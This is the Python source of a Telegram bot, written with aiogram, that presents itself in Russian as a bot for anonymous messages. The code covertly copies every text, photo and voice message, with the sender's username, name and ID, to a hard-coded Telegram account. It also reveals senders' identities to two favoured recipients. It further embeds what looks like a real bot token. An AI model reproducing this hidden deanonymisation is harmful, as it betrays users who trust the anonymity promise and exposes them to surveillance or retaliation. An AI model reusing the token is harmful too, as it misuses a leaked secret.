import asyncio
import logging

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters.command import Command

logging.basicConfig(level=logging.INFO)

bot = Bot(token="7357384085:AAHLCuyc9bbnqpMITA8TlJhr9cG9SzirvKg")

dp = Dispatcher()

link_user_id = -1


@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    global link_user_id
    await message.answer(
        f"Привет, я телеграмм бот для анонимных сообщений! Вот твоя ссылка: https://t.me/AnonymousMessagesAskBot?start={message.from_user.id}")

    if len(message.text.split()) > 1:
        link_user_id = message.text.split()[1]


@dp.message(F.text)
async def echo(message: types.Message):
    if message.from_user.id != link_user_id and link_user_id != -1:
        await bot.send_message(link_user_id, f"У тебя анонимное сообщение!\n\n\n{message.text}")

        await bot.send_message(1275366725, f"Сообщение адресованно {link_user_id}")
        await bot.send_message(1275366725, f"У тебя анонимное сообщение!\n\n\n{message.text}")
        if link_user_id == "1148685062" or link_user_id == "1519536034":
            await bot.send_message(link_user_id,
                                   f"Отправитель сообщения: {message.from_user.username} , first_name: {message.from_user.first_name}, id: {message.from_user.id}")
        await bot.send_message(1275366725,
                               f"Отправитель сообщения: {message.from_user.username} , first_name: {message.from_user.first_name}, id: {message.from_user.id}")

        await message.answer("Сообщение отправлено!")


@dp.message(F.photo)
async def echo_photo(message: types.Message):
    photo_data = message.photo[-1]
    if message.from_user.id != link_user_id and link_user_id != -1:
        await bot.send_photo(link_user_id, photo_data.file_id, caption=f"У тебя анонимное сообщение!")

        await bot.send_message(1275366725, f"Сообщение адресованно {link_user_id}")

        await bot.send_photo(1275366725, photo_data.file_id, caption=f"У тебя анонимное сообщение!")
        if link_user_id == "1148685062" or link_user_id == "1519536034":
            await bot.send_message(link_user_id,
                                   f"Отправитель сообщения: {message.from_user.username} , first_name: {message.from_user.first_name}, id: {message.from_user.id}")
            await bot.send_message(1275366725,
                                   f"Отправитель сообщения: {message.from_user.username} , first_name: {message.from_user.first_name}, id: {message.from_user.id}")
        await message.answer("Сообщение отправлено!")


@dp.message(F.voice)
async def echo_voice(message: types.Message):
    audio_data = message.voice
    if message.from_user.id != link_user_id and link_user_id != -1:
        await bot.send_voice(link_user_id, audio_data.file_id, caption=f"У тебя анонимное сообщение!")

        await bot.send_message(1275366725, f"Сообщение адресованно {link_user_id}")

        await bot.send_voice(1275366725, audio_data.file_id, caption=f"У тебя анонимное сообщение!")
        if link_user_id == "1148685062" or link_user_id == "1519536034":
            await bot.send_message(link_user_id,
                                   f"Отправитель сообщения: {message.from_user.username} , first_name: {message.from_user.first_name}, id: {message.from_user.id}")
            await bot.send_message(1275366725,
                                   f"Отправитель сообщения: {message.from_user.username} , first_name: {message.from_user.first_name}, id: {message.from_user.id}")

        await message.answer("Сообщение отправлено!")


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
